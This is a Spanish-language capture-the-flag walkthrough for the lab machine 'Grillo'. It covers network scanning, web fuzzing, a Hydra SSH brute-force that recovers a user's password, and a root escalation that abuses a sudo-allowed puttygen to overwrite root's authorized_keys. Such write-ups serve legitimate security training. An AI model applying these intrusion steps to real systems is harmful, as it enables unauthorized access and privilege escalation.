# Grillo

Maquinas que utilizamos Kali Linux y Grillo [https://thehackerslabs.com/grillo/](https://thehackerslabs.com/grillo/)

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%2029.png)

```bash
ping -c 1 10.0.3.27 
```

Es una maquina Linux.

![image.png](./imagenes/image%2030.png)

```bash
nmap -p- -sS -sV -sC --open -min-rate=2000 -n -vvv -Pn 10.0.3.27
```

![image.png](./imagenes/image%2031.png)

`22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)`

`80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))`

- Miramos el contenido del puerto 80 en el navegador web
    
    ![image.png](./imagenes/image%2032.png)
    

- Hacemos fuzzing web .
    
    ```bash
    gobuster dir -u http://10.0.3.27 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,sh,html,txt
    ```
    
    ![image.png](./imagenes/image%2033.png)
    

```bash
dirb http://10.0.3.277
```

![image.png](./imagenes/image%2034.png)

```bash
dirsearch -u http://10.0.3.27/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

![image.png](./imagenes/image%2035.png)

No encontramos nada

- Volvemos a mirar en el navegador pero inspeccionamos el código fuente.
    
    `CTRL+U`
    
    ![image.png](./imagenes/image%2036.png)
    
    Al final del código vemos este comentario y nos da una pitas de un posible nombre de ususrio para SSH. “**melanie**”
    

- Hacemos un ataque de fuerza bruta a SSH con Hydra.
    
    ```bash
    hydra -l melanie -P /usr/share/wordlists/rockyou.txt ssh://10.0.3.27
    ```
    
    ![image.png](./imagenes/image%2037.png)
    
    Ya tenemos **Usuario: melanie y Password: trustno1**
    

- Lo probamos en SSH.
    
    ```bash
    ssh melanie@10.0.3.27
    ```
    
    ![image.png](./imagenes/image%2038.png)
    

`ls -la`

![image.png](./imagenes/image%2039.png)

    
- Miramos dentro del directorio **/opt**
    
    <aside>
    
    El directorio /opt se usa para instalar software adicional que no forma parte del sistema operativo base. Es decir, aquí suelen encontrarse aplicaciones, paquetes de software y herramientas de terceros que han sido instalados manualmente o por algún administrador.
    
    </aside>
    
    `cd /opt`
    
    `ls -la`
    
    ![image.png](./imagenes/image%2041.png)
    
    No hay nada
    
- Hacemos sudo -l
    
    ![image.png](./imagenes/image%2042.png)
    
    `/usr/bin/puttygen`
    
    <aside>
    💡
    
    PuTTYgen es una herramienta utilizada en Linux para generar claves SSH públicas y privadas. Funciona de manera similar a ssh-keygen en OpenSSH y permite crear pares de claves para autenticación segura. Además, PuTTYgen puede convertir formatos de claves y almacenar claves en archivos .ppk, que son el formato nativo de PuTTY.
    
    </aside>
    
- Nos vamos al directorio home y creamos un  par de claves: una privada y una pública
`ssh-keygen`
    
    ![image.png](./imagenes/image%2043.png)
    
    `cd melanie/`
    
    `ls -la`
    
    `cd .ssh`
    
    `ls`
    
    ![image.png](./imagenes/image%2044.png)
    

- Hacemos que clave pública la podamos utilizar para autentificarnos en SSH.
    
    `sudo /usr/bin/puttygen id_rsa.pub -O public-openssh -o /root/.ssh/authorized_keys`
    
    <aside>
    💡
    
    Este comando convierte una clave pública SSH que hemos generado con ssh-keygen y  **PuTTYgen** (id_rsa.pub) la convierte al formato OpenSSH y la guarda en el archivo authorized_key dentro del directorio **.ssh** de root ya que Puttygen tiene permisos de root. Esto permite que la clave pública sea utilizada para autenticación SSH en un servidor Linux.
    
    </aside>
    
    ![image.png](./imagenes/image%2045.png)
    
- Nos conectamos a SSH como root.
    
    `ssh root@10.0.3.27`
    
    ![image.png](./imagenes/image%2046.png)
    
    No nos pide contraseña
 